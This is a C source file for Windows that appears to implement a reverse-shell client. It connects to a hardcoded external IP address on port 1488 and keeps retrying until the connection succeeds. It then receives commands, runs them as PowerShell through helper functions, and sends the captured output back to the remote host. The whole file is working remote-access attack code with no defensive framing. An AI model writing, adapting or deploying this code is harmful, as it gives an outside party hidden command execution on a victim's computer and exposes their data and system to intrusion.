#ifndef UNICODE
#define UNICODE
#endif 

#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <string.h>
#include <io.h>
#include <fcntl.h>
#include "commandmanager.h"

#define MAX_SIZE_C 200000
#define MAX_SIZE_W 200000

FILE *OUTPUT_FILE;

void read_output(wchar_t *woutput);

int main()
{
    _setmode(_fileno(stdout), _O_U16TEXT);
    _setmode(_fileno(stdin), _O_U16TEXT);

    WSADATA ws;
    WSAStartup(MAKEWORD(2, 2), &ws);

    SOCKET soc = socket(AF_INET, SOCK_STREAM, 0);

    SOCKADDR_IN sai;
    memset(&sai, 0, sizeof(sai));
    sai.sin_family = AF_INET;
    sai.sin_port = htons(1488);

    FILE *pFile;
    pFile = fopen("output.txt", "w");
    fclose(pFile);

    sai.sin_addr.S_un.S_addr = inet_addr("178.64.119.39");
    
    int result;
    while ((result = connect(
        soc, (const struct sockaddr *) &sai, sizeof(sai))) != 0)
        {
            _putws(L"Cannot connect to server!\n");
            Sleep(10000);
        }

    wchar_t dataw[MAX_SIZE_C];
    unsigned char datac[MAX_SIZE_W];

    memset(dataw, 0, sizeof(dataw));
    memset(datac, 0, sizeof(datac));

    int sended;
    while ((sended = recv(soc, datac, sizeof(datac), 0)) > 0)
    {                    
        int nibites = MultiByteToWideChar(CP_UTF8, 0, datac, -1, NULL, 0);
            int iconverted = MultiByteToWideChar(
                CP_UTF8, 0, datac, -1, dataw, nibites);
        to_powershell_command(dataw);
        execute_powershell_command(dataw);
        Sleep(2000);

        read_output(dataw);
        int nobites = WideCharToMultiByte(CP_UTF8, 0, (const wchar_t *) dataw, -1, NULL, 0, NULL, NULL);
            int oconverted = WideCharToMultiByte(
                CP_UTF8, 0, (const wchar_t *) dataw, -1, datac, nobites, NULL, NULL);
        
        send(soc, datac, oconverted, 0);
    }
    

    return 0;
}

void read_output(wchar_t *woutput)
{
    FILE *foutput;
    foutput = fopen("output.txt", "rt+, ccs=UTF-8");
    if (foutput == NULL)
    {
        _putws(L"File cannot be open\n");
        return;
    }

    int i = 0;
    for (int s = fgetwc(foutput); s != WEOF; s = fgetwc(foutput))
    {
        woutput[i] = ((wchar_t) s);
        i++;
    }

    fclose(foutput);
    woutput[i] = '\0';

    return;
}